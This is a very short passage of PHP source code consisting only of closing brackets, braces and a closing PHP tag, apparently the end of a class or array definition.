            ];
        }
    }
    


}

?>
